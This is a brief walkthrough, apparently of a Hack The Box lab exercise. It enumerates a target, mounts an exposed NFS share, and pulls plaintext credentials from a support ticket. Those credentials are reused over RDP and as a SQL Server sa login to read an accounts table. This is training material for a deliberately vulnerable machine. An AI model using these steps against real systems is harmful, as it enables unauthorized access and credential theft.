**Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.
```
sudo nmap -Pn --min-rate 500 --max-rtt-timeout 300ms 10.129.214.71
showmount -e 10.129.214.71
mkdir target-NFS
sudo mount -t nfs 10.129.214.71:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
sudo ls -la /TechSupport
sudo cp TechSupport/ticket4238791283782.txt ~
cd ~
sudo cat ticket4238791283782.txt
```
- alex:lol123!mD (alex.g@web.dev.inlanefreight.htb)

```
xfreerdp /v:10.129.214.71 /u:alex /p:'lol123!mD'
```
- SQL server
- C:\Users\alex\devshare
- sa:87N1ns@slls83
- Run as Administrator with creds above
- Databases > accounts > Tables > dbo.devsacc > right-click > show top 1000 rows
